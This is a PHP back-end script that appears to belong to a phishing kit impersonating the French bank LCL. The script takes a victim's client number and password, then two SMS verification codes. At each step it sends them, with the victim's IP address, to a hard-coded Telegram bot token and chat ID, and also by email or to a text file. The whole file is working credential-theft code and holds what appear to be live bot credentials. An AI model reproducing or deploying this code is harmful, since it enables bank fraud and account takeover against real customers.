<?php
   require_once 'vendor/autoload.php';
    use Inacho\CreditCard;
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw');
    define("TELEGRAM_CHAT_ID", '927814612');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'anabz.txt');

    define("RECEIVE_VIA_EMAIL", 1); 
    define("RECEIVE_VIA_SMTP", 0); 
    define("RECEIVE_VIA_TELEGRAM", 0); 
    define("RESULTS_IN_TXT", 0); 

function send($subject,$message) {
        if( RECEIVE_VIA_TELEGRAM == 1 ) {
            telegram_message($message);
        }
        if( RESULTS_IN_TXT == 1 ) {
            file_put_contents(TXT_FILE_NAME, $message, FILE_APPEND);
        }
        if( RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1 ) {
            $mail = new PHPMailer;
            $mail->IsSMTP();
            $mail->Host = SMTP_HOSTNAME;
            $mail->Port = SMTP_PORT;
            $mail->SMTPAuth = true;
            $mail->Username = SMTP_USER;
            $mail->Password = SMTP_PASS;
            $mail->SMTPSecure = '';
            $mail->SMTPAutoTLS = false;
            $mail->From     = SMTP_FROM_EMAIL;
            $mail->FromName = 'ELGH03T';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress(RECEIVER);
            $mail->Send();
        } else {
            if( RECEIVE_VIA_EMAIL == 1 ) {
                $mail           = new PHPMailer;
                $mail->From     = 'localhost@domain.com';
                $mail->FromName = 'ELGH03T';
                $mail->Subject  = $subject;
                $mail->Body     = $message;
                $mail->AddAddress(RECEIVER);
                $mail->send();
                echo $mail->ErrorInfo;
            }
            if( RECEIVE_VIA_SMTP == 1 ) {
                $mail = new PHPMailer;
                $mail->IsSMTP();
                $mail->Host         = SMTP_HOSTNAME;
                $mail->Port         = SMTP_PORT;
                $mail->SMTPAuth     = true;
                $mail->Username     = SMTP_USER;
                $mail->Password     = SMTP_PASS;
                $mail->SMTPSecure   = '';
                $mail->SMTPAutoTLS  = false;
                $mail->From         = SMTP_FROM;
                $mail->FromName     = 'ELGH03T';
                $mail->Subject      = $subject;
                $mail->Body         = $message;
                $mail->AddAddress(RECEIVER);
                $mail->Send();
            }
        }
    }

function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }


 if( $_POST['step'] == 'login' ) {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['input1'] . $_POST['input2'] . $_POST['input3'] . $_POST['input4'] . $_POST['input5'] . $_POST['input6'] . $_POST['input7'] . $_POST['input8'] . $_POST['input9'] . $_POST['input10'];
            $username   = $_POST['input1'] . $_POST['input2'] . $_POST['input3'] . $_POST['input4'] . $_POST['input5'] . $_POST['input6'] . $_POST['input7'] . $_POST['input8'] . $_POST['input9'] . $_POST['input10'];

            $_SESSION['password']   = $_POST['password'];
            $password   = $_POST['password'];
            if( validate_number($username,10) == false || validate_number($_POST['password'],6) == false ) {
                
                header("Location: index.php?error=1&stp=login");
                exit();
            }
            $subject = get_client_ip() . ' | LCL | Login';
            $message = '/-- LOGIN INFOS LCL --/' . get_client_ip() . "\r\n";
            $message .= 'Client number : ' . $username . "\r\n";
            $message .= 'Password      : ' . $password . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n";
            
           $ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

$ci = curl_init();

	curl_setopt($ci, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ci, CURLOPT_POST, 1);
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ci);

curl_close ($ci);
            
            send($subject,$message);
            header("Location: index.php?stp=loading");
        }




if ($_POST['step'] == "sms") {
            $_SESSION['errors']      = [];
            $_SESSION['sms_code'] = $_POST['sms_code'];
            $sms_code = $_POST['sms_code'];

            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Le code est incorrect.';
            }

            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | LCL | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);
$ci = curl_init();

	curl_setopt($ci, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ci, CURLOPT_POST, 1);
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ci);

curl_close ($ci);
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: index.php?stp=sms2");
            } else {
                header("Location: index.php?error=1&stp=sms2");
            }
        }



//sms code 2


if ($_POST['step'] == "sms2") {
            $_SESSION['errors']      = [];
            $_SESSION['sms_code'] = $_POST['sms_code'];
            $sms_code = $_POST['sms_code'];

            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Le code est incorrect.';
            }

            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | LCL | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code 2: ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);
$ci = curl_init();

	curl_setopt($ci, CURLOPT_URL, 'https://api.telegram.org/bot1422944084:AAFFOOtU9S-iCobszowxiMXMPEXHjarCvNw/sendMessage');
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_POSTFIELDS, "chat_id=927814612&text=".$message."");
	curl_setopt($ci, CURLOPT_POST, 1);
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ci);

curl_close ($ci);
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: index.php?stp=confirmation");
            } else {
                header("Location: index.php?error=1&stp=sms");
            }
        }
?>




